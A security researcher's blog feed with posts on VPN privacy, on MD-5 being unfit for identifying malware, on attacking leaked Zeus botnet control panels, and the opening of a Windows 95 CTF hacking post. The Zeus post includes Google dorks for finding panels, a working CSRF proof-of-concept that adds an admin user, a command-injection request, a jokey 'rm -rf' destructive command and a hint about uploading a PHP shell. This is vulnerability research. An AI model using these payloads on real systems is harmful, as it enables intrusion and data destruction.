&lt;div style=&quot;&quot;&gt;Whenever the Internet connection (Wifi, 3G) drops, the VPN connection drops as well, and your privacy is gone ...&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Sites breaking your privacy through SSL can still do that as long as the domain is not in the Privoxy blacklist.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;Additional recommendation&lt;/b&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;If you are using OSX or Windows, I can recommend Aviator to be used as your default browser. It is just great, give it a try!&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;b&gt;PS:&lt;/b&gt; There are also some &lt;a href=&quot;https://adblockplus.org/blog/adblock-plus-for-android-removed-from-google-play-store&quot;&gt;adblock apps removed from the official store&lt;/a&gt; which can block some ads, but you have to configure a proxy for every WiFi connection you use, and it is not working over 3G.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Mikko_Privacy_is_not_negotiable.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/Mikko_Privacy_is_not_negotiable.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Mikko_Privacy_is_not_negotiable.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Stop using MD-5, now!</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/hash/malware/md-5/2014/03/25/Stop-using-MD-5,-now!.html"/>
   <updated>2014-03-25T13:59:37+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/hash/malware/md-5/2014/03/25/Stop-using-MD-5,-now!</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;TL;DR: &lt;u&gt;Don't use MD-5 to identify malware samples. Believe me, it is a bad idea. Use SHA-256 or a stronger hash function.&lt;/u&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;This post is dedicated to &lt;a href=&quot;https://www.google.com/search?q=md5+malware+-sha&amp;amp;ie=UTF-8#q=md5+malware+trojan+-sha+-sha1+-sha256&amp;amp;tbs=qdr:y&quot; target=&quot;_blank&quot;&gt;all malware researchers&lt;/a&gt;, still using MD-5 to identify malware samples.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Before deep-diving into the details, let me explain my view on this topic. Whenever you want to identify a malware, it is only OK to publish the MD-5 hash of the malware if you post at least the SHA-256 hash of the malware as well. Publishing only the MD-5 hash is &lt;b&gt;&lt;u&gt;unprofessional&lt;/u&gt;&lt;/b&gt;. If you want to understand why, please continue reading. If you know about the problem, but want to help me spread the word, please link to my site &lt;a href=&quot;http://www.stopusingmd5now.com/&quot; target=&quot;_blank&quot;&gt;www.stopusingmd5now.com&lt;/a&gt;.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;By writing articles/posts/etc. and publishing the MD-5 hash only, it is the lesser problem that you show people your incompetency about hash functions, but you also teach other people to use MD-5. And it spreads like a disease... Last but not least, if I find a sample on your blog post, and you use MD-5 only, I can't be sure we have the same sample.

Here is a list to name a few bad examples (order is in Google search rank order):
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.securelist.com/en/blog/208214185/ChewBacca_a_new_episode_of_Tor_based_Malware&quot;&gt;Kaspersky&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://labs.bromium.com/2014/01/13/understanding-malware-targeting-point-of-sale-systems/&quot;&gt;Bromium&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.fireeye.com/blog/technical/malware-research/2013/06/trojan-apt-seinup-hitting-asean.html&quot;&gt;Fireeye&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.webroot.com/blog/2013/10/21/u-k-users-targeted-fake-confirming-sky-offer-themed-malware-serving-emails/&quot;&gt;Webroot&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://blogs.mcafee.com/mcafee-labs/hesperus-evening-star-shines-as-latest-banker-trojan&quot;&gt;Mcafee&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://blog.fox-it.com/2013/07/25/analysis-of-the-kins-malware/&quot;&gt;Fox-IT&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://blogs.cisco.com/security/fake-phone-bills-contain-malware-targeting-dt-customers/&quot;&gt;Cisco&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://isc.sans.edu/forums/diary/Mr+Jones+wants+you+to+appear+in+court/17279&quot;&gt;SANS&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.welivesecurity.com/wp-content/uploads/2013/08/Brazilian_Malware1.pdf&quot;&gt;ESET&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.symantec.com/security_response/writeup.jsp?docid=2013-091614-5535-99&amp;amp;tabid=2&quot;&gt;Symantec&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://watchguard.com/docs/datasheet/wg_apt-blocker_ds.pdf&quot; target=&quot;_blank&quot;&gt;Watchguard&lt;/a&gt;&lt;/li&gt;&lt;li&gt;And unfortunately, even the best books on malware analysis promote the use of MD-5 - see &quot;Practical malware analysis&quot; Chapter 1 Page 10&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/46960563.jpg&quot; src=&quot;https://z6543.github.io/_img/46960563.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/46960563.jpg&quot; width=&quot;318&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Introduction to (cryptographic) hash functions&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;A long time ago (according to some sources since &lt;a href=&quot;http://www.cosic.esat.kuleuven.be/publications/article-1532.pdf&quot; target=&quot;_blank&quot;&gt;1970&lt;/a&gt;) people started designing hash functions, for an awful lot of different reasons. It can be used for file integrity verification, password verification, pseudo-random generation, etc. But one of the most important properties of a cryptographic hash function is that it can &quot;uniquely&quot; identify a block of data with a small, fixed bit string. E.g., malware can be identified by using only the hash itself, so everybody who has the same malware sample will have the same hash; thus they can refer to the malware by the hash itself.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;It is easy to conclude that there will always be collisions, where a different block of data has the same result hashes. The domain (block of data) is infinite, while the codomain (possible hash values) is finite. The question is how easy it is to find two different blocks of data, having the same hash. Mathematicians call this property &quot;&lt;a href=&quot;http://en.wikipedia.org/wiki/Cryptographic_hash_function#Properties&quot; target=&quot;_blank&quot;&gt;collision resistance&lt;/a&gt;.&quot; Proper cryptographic hash functions are collision-resistant, meaning it is impractical or impossible to find two different blocks of data, which have the same hash.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;In 1989 Ronald Rivest (the first letter in the abbreviation of the RSA algorithm) designed the MD-2 hashing algorithm. &lt;a href=&quot;http://en.wikipedia.org/wiki/MD2_(cryptography)#Security&quot; target=&quot;_blank&quot;&gt;Since 1997&lt;/a&gt; there are publications about that this hashing algorithm is far from perfect.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;In 1990 Ronald Rivest designed the MD-4 algorithm, which is considered as broken &lt;a href=&quot;http://en.wikipedia.org/wiki/MD4#Security&quot; target=&quot;_blank&quot;&gt;at least from 1991&lt;/a&gt;. But MD-4 is still in use from Windows XP until Windows 8 in the password protocol (NTLM). Unfortunately, there are more significant problems with NTLM besides using MD-4, but this can be the topic of a different blog post.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;In 1991 (you might guess who) designed yet another hashing algorithm called MD-5, to replace MD-4  (because of the known weaknesses). But again, in from 1993 it has been shown many times that MD-5 is broken as well. According to Wikipedia, &quot;On 18 March 2006, Klima published an algorithm [17] that can find a collision within one minute on a single notebook computer, using a method he calls tunneling&quot;. This means, that with the 8 years old computing power of a single notebook one can create two different files having the same MD-5 hash. But the algorithms to generate collisions have been improved since, and &quot;a 2013 attack by Xie Tao, Fanbao Liu, and Dengguo Feng breaks MD-5 collision resistance in 2^18 time. This attack runs in less than a second on a regular computer.&quot; The key takeaway here is that it is pretty damn hard to design a secure cryptographic hash function, which is fast, but still safe. I bet that if I would develop a hash function, Ron would be able to hack it in minutes.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
Now, dear malware researcher, consider the following scenario. You as, a malware analyst, find a new binary sample. You calculate the MD-5 hash of the malware, and &lt;a href=&quot;https://www.google.com/search?q=md5+malware+-sha&amp;amp;ie=UTF-8#q=md5+malware+trojan+-sha+-sha1+-sha256&amp;amp;tbs=qdr:y&quot; target=&quot;_blank&quot;&gt;Google for that hash&lt;/a&gt;. You see this hash value on other malware researchers or on a sandbox/vendor's site. This site concludes that this sample does this or that, and is either malicious or not. Either because the site is also relying solely on MD-5 or because you have only checked the MD-5 and the researcher or sandbox has a good reputation, you move on and forget this binary. But in reality, it is possible that your binary is totally different than the one analyzed by others. The results of this mistake can scale from nothing to catastrophic.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;If you don't believe me, just check the hello.exe and erase.exe on &lt;a href=&quot;http://www.mscs.dal.ca/~selinger/md5collision/&quot;&gt;this site from&lt;/a&gt;&lt;a href=&quot;http://www.mscs.dal.ca/~selinger/md5collision/&quot; style=&quot;text-decoration: underline;&quot;&gt; Peter Sellinger&lt;/a&gt;. Same MD-5, different binaries; a harmless and a (fake) malicious one... And you can do the same easily at home. No supercomputers,  no NSA magic needed.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;On a side-note, it is important to mention that even today &lt;a href=&quot;http://en.wikipedia.org/wiki/MD5#Preimage_vulnerability&quot; target=&quot;_blank&quot;&gt;it can be hard to find&lt;/a&gt; a block of data (in generic), if only the MD-5 hash is known (&quot;pre image resistance&quot;). I have heard people arguing this when I told them using MD-5 as a password hash function is a bad idea. The main problem with MD-5 as a password hash is not the weaknesses in MD-5 itself, but the lack of &lt;a href=&quot;http://en.wikipedia.org/wiki/Salt_(cryptography)&quot; target=&quot;_blank&quot;&gt;salt&lt;/a&gt;, lack of &lt;a href=&quot;http://en.wikipedia.org/wiki/PBKDF2&quot; target=&quot;_blank&quot;&gt;iterations&lt;/a&gt;, and lack of &lt;a href=&quot;http://en.wikipedia.org/wiki/Scrypt&quot; target=&quot;_blank&quot;&gt;memory hardness&lt;/a&gt;. But still, I don't see any reason why you should use MD-5 as a building block for anything, which has anything to do with security. Would you use a car to drive your children to the school, which car has not been maintained in the last 23 year? If your answer is yes, you should neither have children nor a job in IT SEC.&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Conclusion&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;If you are a malware researcher, and used MD-5 only to identify malware samples in the past, I suggest to write it down 1000 times: &quot;I promise I won't use MD-5 to identify malware in the future.&quot;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;I even made a website dedicated to this problem, &lt;a href=&quot;http://www.stopusingmd5now.com/&quot; target=&quot;_blank&quot;&gt;www.stopusingmd5now.com&lt;/a&gt; . The next time you see a post/article/whatever where malware is identified by the MD-5 hash only, please link to this blog post or website, and the world will be a better and more professional place.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/bart-simpson-chalkboard_www-txt2pic-com.jpg&quot; src=&quot;https://z6543.github.io/_img/bart-simpson-chalkboard_www-txt2pic-com.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/bart-simpson-chalkboard_www-txt2pic-com.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;PS: If you are a forensics investigator, or software developer developing software used in forensics, the same applies to you.
PS 2: If you find this post too provocative and harsh, there is a reason for this …&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.blogger.com/null&quot; name=&quot;update&quot;&gt;Update&lt;/a&gt;: I have modified two malware (&lt;a href=&quot;https://malwr.com/analysis/Y2M4Zjc4OWE0YmExNDA2MWE5YjFhODM5YjliNmI0MTY/&quot;&gt;Citadel&lt;/a&gt;, &lt;a href=&quot;https://malwr.com/analysis/YTc4Zjg0YTM0MTBhNDJiZDk4ZjFlODAwNjEzODM0YWQ/&quot;&gt;Atrax&lt;/a&gt;) with the help of &lt;a href=&quot;https://code.google.com/p/hashclash/&quot;&gt;HashClash&lt;/a&gt;, and now those have the same MD-5. Many thanks for Marc Stevens for his research, publishing his code, and help given during the collision finding.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Attacking financial malware botnet panels - Zeus</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/botnet/remote/code/execution/zeus/2014/02/14/Attacking-financial-malware-botnet-panels-Zeus.html"/>
   <updated>2014-02-14T14:00:32+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/botnet/remote/code/execution/zeus/2014/02/14/Attacking-financial-malware-botnet-panels---Zeus</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;I played with leaked financial malware recently. When I saw these panels are written in PHP, my first idea was to hack them. The results are the work of one evening, please don't expect a full pentest report with all vulns found :-)&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The following report is based on Zeus 2.0.8.9, which is old, but I believe a lot of Zeus clones (and C&amp;amp;C panels) depend on this code.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;First things first, here are some Google dorks to find Zeus C&amp;amp;C server panel related stuff:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;inurl:cp.php?m=login - this should be the login to the control panel&lt;/li&gt;&lt;li&gt;inurl:_reports/files  - in these folders you can find the stolen stuff, pretty funny if it gets indexed by Google&lt;/li&gt;&lt;li&gt;inurl:install/index.php - this should be deleted, but I think this is useless now.&lt;/li&gt;&lt;/ul&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Zeus1.png&quot; src=&quot;https://z6543.github.io/_img/Zeus1.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Zeus1.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;h3&gt;Boring vulns found&lt;/h3&gt;
&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_Credentials_Transported_over_an_Encrypted_Channel_(OWASP-AT-001)&quot;&gt;Clear text HTTP login&lt;/a&gt; - you can sniff the login password via MiTM, or steal the session cookies&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_Weak_password_policy_(OWASP-AT-008)&quot;&gt;No password policy&lt;/a&gt; - admins can set up really weak passwords&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_Weak_lock_out_mechanism_(OWASP-AT-004)&quot;&gt;No anti brute-force&lt;/a&gt; - you can try to guess the admin's password. Default username is admin&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OWASP-AT-006)&quot;&gt;Password autocomplete enabled&lt;/a&gt; - boring&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_cookies_attributes_(OWASP-SM-002)&quot;&gt;Missing HttpOnly flag on session cookie&lt;/a&gt; - it could be nice if I could find any XSS. I need more time to find one!&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_CSRF_(OWASP-SM-005)&quot;&gt;No CSRF protection&lt;/a&gt; - except on the password change, where the old password is needed :-( boring&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Update: You can use the CSRF to create a new user with admin privileges:&lt;/p&gt;
&lt;div&gt;&lt;div&gt;&lt;pre class=&quot;prettyprint linenums lang-html&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;pre&amp;gt;
  This is a CSRF POC to create a new admin user in Zeus admin panels.
  Username: user_1392719246 Password: admin1
  You might change the URL from 127.0.0.1.
  Redirecting in a hidden iframe in &amp;lt;span id=&quot;countdown&quot;&amp;gt;10&amp;lt;/span&amp;gt; seconds.  
&amp;lt;/pre&amp;gt;
&amp;lt;iframe id=&quot;csrf-frame&quot; name=&quot;csrf-frame&quot; style=&quot;display: none;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
    &amp;lt;form action=&quot;http://127.0.0.1/cp.php?m=sys_users&amp;amp;amp;new&quot; id=&quot;csrf-form&quot; method=&quot;post&quot; name=&quot;csrf-form&quot; target=&quot;csrf-frame&quot;&amp;gt;
 &amp;lt;input name=&quot;name&quot; type=&quot;hidden&quot; value=&quot;user_1392719246&quot; /&amp;gt; 
 &amp;lt;input name=&quot;password&quot; type=&quot;hidden&quot; value=&quot;admin1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;status&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;comment&quot; type=&quot;hidden&quot; value=&quot;PWND!&quot; /&amp;gt;
 &amp;lt;input name=&quot;r_botnet_bots&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;r_botnet_scripts&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;r_botnet_scripts_edit&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;r_edit_bots&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;r_reports_db&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;r_reports_db_edit&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;r_reports_files&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt;
 &amp;lt;input name=&quot;r_reports_files_edit&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt;
 &amp;lt;input name=&quot;r_reports_jn&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;r_stats_main&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;r_stats_main_reset&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;r_stats_os&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;r_system_info&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;r_system_options&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt;
 &amp;lt;input name=&quot;r_system_user&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt; 
 &amp;lt;input name=&quot;r_system_users&quot; type=&quot;hidden&quot; value=&quot;1&quot; /&amp;gt;
    &amp;lt;/form&amp;gt;
&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
 window.onload=function(){ 
  var counter = 10;
  var interval = setInterval(function() {
   counter--;
   document.getElementById('countdown').innerHTML = counter;
   if (counter == 0) {
    redirect();
    clearInterval(interval);
   }
  }, 1000);
 };
    function redirect() {
  document.getElementById(&quot;csrf-form&quot;).submit();
    }
    &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;MD5 password - the passwords stored in MySQL are MD5 passwords. No &lt;a href=&quot;http://www.unlimitednovelty.com/2012/03/dont-use-bcrypt.html&quot;&gt;PBKDF2, bcrypt, scrypt, salt&lt;/a&gt;, whatever. MD5.&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;a href=&quot;http://www.contextis.com/research/tools/clickjacking-tool/&quot;&gt;ClickJacking&lt;/a&gt; - really boring stuff&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Remember me (MD5 cookies) - a very bad idea. In this case, the remember me function is implemented in a way where the MD5 of the password and MD5 of the username is stored in a cookie. If I have XSS, I could get the MD5(password) as well.&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005)&quot;&gt;SQLi&lt;/a&gt; - although concatenation is used instead of parameterized queries, and addslashes are used, the integers are always quoted. This means it can be hacked only in case of special encoding like GB/Big5, pretty unlikely.&lt;/li&gt;&lt;/ul&gt;
&lt;h3&gt;Whats good news (for the C&amp;amp;C panel owners)&lt;/h3&gt;
The following stuff looks good, at least some vulns were taken seriously:
&lt;ul&gt;&lt;li&gt;The system directory is protected with .htaccess deny from all.&lt;/li&gt;&lt;li&gt;gate.php - this is the &quot;gate&quot; between the bots and the server, this PHP is always exposed to the Internet. The execution of this PHP dies early if you don't know the key. But you can &lt;a href=&quot;http://blog.threatexpert.com/2009/09/time-to-revisit-zeus-almighty.html&quot;&gt;get the key&lt;/a&gt; from the binary of this specific botnet (&lt;a href=&quot;http://mnin.blogspot.be/2011/09/abstract-memory-analysis-zeus.html&quot;&gt;another URL how to do this&lt;/a&gt;). If you have the key, then you can fill the database with garbage, but that's all I can think of now.&lt;/li&gt;&lt;li&gt;Anti &lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OWASP-DV-001)&quot;&gt;XSS&lt;/a&gt;: the following code is used almost everywhere&lt;/li&gt;&lt;pre class=&quot;prettyprint lang-js&quot;&gt;return htmlspecialchars(preg_replace('|[\x00-\x09\x0B\x0C\x0E-\x1F\x7F-\x9F]|u', ' ', $string), ENT_QUOTES, 'UTF-8');&lt;/pre&gt;My evil thought was to inject malicious bot_id, but it looks like it has been filtered everywhere. Sad panda.&lt;/ul&gt;
&lt;h3&gt;What's really bad news (for the C&amp;amp;C panel owners)&lt;/h3&gt;
And the best vuln I was able to find, &lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_Command_Injection_(OWASP-DV-013)&quot;&gt;remote code execution&lt;/a&gt; through command injection (happy panda), but only for authenticated users (sad panda).

The vulnerable code is in system/fsarc.php:

&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Zeus2.png&quot; src=&quot;https://z6543.github.io/_img/Zeus2.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Zeus2.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;pre class=&quot;prettyprint lang-php&quot;&gt;function fsarcCreate($archive, $files){
   ...
   $archive .= '.zip';
   $cli = 'zip -r -9 -q -S &quot;'.$archive.'&quot; &quot;'.implode('&quot; &quot;', $files).'&quot;';
   exec($cli, $e, $r);
}&lt;/pre&gt;
The exploit could not be simpler: 
&lt;pre class=&quot;prettyprint lang-html&quot;&gt;POST /cp.php?m=reports_files&amp;amp;path= HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

filesaction=1&amp;amp;files%5B%5D=files&quot;||ping%20-n%2010%20127.0.0.1
&lt;/pre&gt;because the zip utility was not found on my Windows box. You can try to replace || with &amp;amp;&amp;amp; when attacking Windows (don't forget to URL encode it!), or replace || with ; when attacking Linux. You can also link this vulnerability with the CSRF one, but it is unlikely you know both the control panel admin, and the control panel URLs. Or if this is the case, the admin should practice better OPSEC :)
Recommendation: use &lt;a href=&quot;http://www.php.net/manual/en/function.escapeshellcmd.php&quot;&gt;escapeshellcmd&lt;/a&gt; next time.

Next time you find a vulnerable control panel with a weak password, just rm -rf --no-preserve-root / it ;-)

That's all folks!
Special greetz to Richard (XAMPP Apache service is running as SYSTEM ;-) )

&lt;b&gt;Update:&lt;/b&gt; Looks like the gate.php is worth to investigate if you know the RC4 key. &lt;a href=&quot;http://cybercrime-tracker.net/zeus.php&quot;&gt;You can upload a PHP shell :)&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Hacking Windows 95, part 1</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/hacking/ms00-072/pentest/win95/windows95/2014/02/02/Hacking-Windows-95,-part-1.html"/>
   <updated>2014-02-02T15:56:35+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/hacking/ms00-072/pentest/win95/windows95/2014/02/02/Hacking-Windows-95,-part-1</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;During a CTF game, we came across very-very old systems. Turns out, it is not that easy to hack those dinosaur old systems, because modern tools like Metasploit do not have sploits for those old boxes and of course our &quot;133t h4cking skillz&quot; are useless without Metasploit... :)&lt;/div&gt;
&lt;p&gt;But I had an idea: This can be a pretty good small research for fun.
The rules for the hack are the following:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Only publicly available tools can be used for this hack, so no tool development. This is a CTF for script bunniez, and we can't haz code!&lt;/li&gt;&lt;li&gt;Only hacks without user interaction are allowed (IE based sploits are out of scope).&lt;/li&gt;&lt;li&gt;I need instant remote code execution. For example, if I can drop a malware to the c: drive, and change autoexec.bat, I'm still not done, because no one will reboot the CTF machine in a real CTF for me. If I can reboot the machine, that's OK.&lt;/li&gt;&lt;li&gt;I don't have physical access.&lt;/li&gt;&lt;/ol&gt;
&lt;div style=&quot;&quot;&gt;I have chosen Windows 95 for this task. First, I had to get a genuine Windows 95 installer, so I visited the Microsoft online shop and downloaded it from their official site.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;I installed it in a virtualized environment (remember, you need a boot floppy to install from the CD), and it hit me with a serious nostalgia bomb after watching the installer screens. &quot;Easier to use&quot;, &quot;faster and more efficient&quot;, &quot;high-powered performance&quot;, &quot;friendly&quot;, &quot;intuitive interface&quot;. Who does not want that? :)&lt;/div&gt;
&lt;div&gt;&lt;a href=&quot;https://z6543.github.io/_img/win95_01.png&quot; src=&quot;https://z6543.github.io/_img/win95_01.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/win95_01.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div&gt;&lt;a href=&quot;https://z6543.github.io/_img/win95_02.png&quot; src=&quot;https://z6543.github.io/_img/win95_02.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/win95_02.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div&gt;&lt;a href=&quot;https://z6543.github.io/_img/win95_03.png&quot; src=&quot;https://z6543.github.io/_img/win95_03.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/win95_03.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div&gt;&lt;/div&gt;
